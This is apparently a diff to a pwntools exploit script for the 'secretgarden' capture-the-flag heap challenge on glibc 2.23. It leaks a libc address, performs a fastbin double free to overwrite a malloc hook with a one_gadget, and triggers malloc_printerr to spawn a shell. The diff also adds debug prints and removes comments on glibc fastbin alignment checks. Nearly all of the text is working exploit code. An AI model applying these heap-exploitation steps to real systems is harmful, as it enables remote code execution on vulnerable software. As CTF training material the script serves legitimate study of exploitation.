@@ -26,9 +26,9 @@ leak_hex = lambda r, offset=0: int(r, 16) - offset
 leak_dec = lambda r, offset=0: int(r, 10) - offset
 pad = lambda len=1, c=b'A': c * len
 
-exe = ELF("secretgarden_patched")
-libc = ELF("libc_64.so.6")
-ld = ELF("./ld-2.23.so")
+exe = ELF("secretgarden_patched", checksec=False)
+libc = ELF("libc_64.so.6", checksec=False)
+ld = ELF("./ld-2.23.so", checksec=False)
 
 context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
 context.binary = exe
@@ -77,39 +77,12 @@ def remove_flower(index):
 def clean_garden():
     slan(p, b'choice', 4)
 
-'''
-DOC KY CODE HON,
-DOC DUNG CODE HON, HIEU NHAM CON TRO, GIA TRI LA KO RA DC BUG
-BOT ASSUME LAI, NHIN VAO CODE DANG THUC SU LAM GI, DUNG NHIN VAO "Y TUONG CUA CODE"
-CO NHIEU LOI RAT SUBTLE, CHECK KY CANG PLS
-
-
-Key Points
-Before glibc 2.32:
-
-malloc and malloc_consolidate don't care about alignment when taking chunks from fastbins
-​
-
-Only free() checks alignment (16-byte on 64-bit)
-​
-
-This means for fastbin poisoning attacks, your fake chunk address doesn't need to be aligned
-
-Starting glibc 2.32 (Safe-Linking):
-
-Explicit alignment checks were added: if (__glibc_unlikely (!aligned_OK (p)))
-
-Multiple checks during fastbin operations will catch misaligned chunks
-​
-
-These checks cause malloc_printerr if alignment is violated
-'''
-
 raise_flower(0x410, b'A', b'A') # 0
 raise_flower(0x60, b'A', b'A') # 1
 raise_flower(0x60, b'A', b'A') # 2
 raise_flower(0x60, b'A', b'A') # 3
 
+print("Leaking libc")
 remove_flower(0)
 clean_garden()
 raise_flower(0x410, b'A', b'A') # 0
@@ -120,6 +93,7 @@ ru(p, b'flower[0] :')
 libc.address = leak_bytes(rn(p, 6), 0x3c3b41)
 lg("libc base", libc.address)
 
+print("Overwriting hooks")
 remove_flower(1)
 remove_flower(2)
 remove_flower(1)
@@ -134,11 +108,13 @@ raise_flower(0x60, b'A', b'A')
 one_gadget = libc.address + 0xef6c4
 lg("one gadget", one_gadget)
 
-# O DAY DINH GHI DE REALLOC DE THOA MAN ONE_GADGET NHUNG MA KO DC, NEN KICH HOAT MALLOC PRINTERR DE GOI MALLOC, STACK SACH HON
 raise_flower(0x60, pad(0x13) + p64(one_gadget), b'A')
 
-# Triggering malloc printerr
+input()
+print("Trigger malloc printerr")
 remove_flower(3)
 remove_flower(3)
 
+print("Spawn shell")
+rr(p, 1)
 ia(p)
